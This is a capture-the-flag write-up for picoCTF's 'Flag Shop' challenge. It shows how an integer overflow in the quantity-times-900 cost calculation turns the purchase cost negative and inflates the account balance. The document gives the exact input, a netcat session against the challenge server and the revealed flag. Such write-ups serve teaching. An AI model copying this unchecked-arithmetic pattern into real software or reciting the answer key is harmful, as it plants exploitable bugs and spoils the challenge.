# Flag Shop

## Write-Up

These kind of problems are known generally by their solution : overflowing variables to invert their values (use the compliments).

After checking the code, and more precisely the buying fake flags section, we can see some interesting things happening in this part :

```C
else if(menu == 2){
    printf("Currently for sale\n");
    printf("1. Defintely not the flag Flag\n");
    printf("2. 1337 Flag\n");
    int auction_choice;
    fflush(stdin);
    scanf("%d", &auction_choice);
    if(auction_choice == 1){
        printf("These knockoff Flags cost 900 each, enter desired quantity\n");
        int number_flags = 0;
        fflush(stdin);
        scanf("%d", &number_flags); //! Enter here input to make it negative
        if(number_flags > 0){
            int total_cost = 0;
            total_cost = 900*number_flags;
            printf("\nThe final cost is: %d\n", total_cost);
            if(total_cost <= account_balance){
                account_balance = account_balance - total_cost; //! it will become positive, to be added to the balance
                printf("\nYour current balance after transaction: %d\n\n", account_balance);
            }
            else{
                printf("Not enough funds to complete purchase\n");
            }
        }
```

As you can see, when we read the `number_flags`, it is being multiplied by 900 to get the `total_cost` which is then substracted to our `acount_balance`, so, if we can make the `total_cost` to be negative, we can instead of diminishing from our account, add to it.

From the overflow rules, when arriving to the vlues edges, the values are reverted to the compliment of it. 

But here we need to pass a positive amount, so the compliment part will come when multiplying by 900. 

Here are some experiments we made :

 - We have the overflow of `int` at `2147483648`
 - When entering `2147483647` as `number_flags`, we get `-900` as Final cost.
 - When entering `2147483646` as `number_flags`, we get `-1800` as Final cost.
 - When entering `2147483640` as `number_flags`, we get `-7200` as Final cost.

These values, when multiplied by -1 in calculating new balance, they are added to account and not substracted.

So, to get 100000, we need to enter the following :

100000/900 = 112

2147483648 - 112 = 2147483536

So our input is 2147483536, to enhance our account, and after that, we can buy the main flag :

```
└─$ nc jupiter.challenges.picoctf.org 44566

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
2147483536

The final cost is: -100800

Your current balance after transaction: 101900

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_68d16363}
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
3
```

## Flag

picoCTF{m0n3y_bag5_68d16363}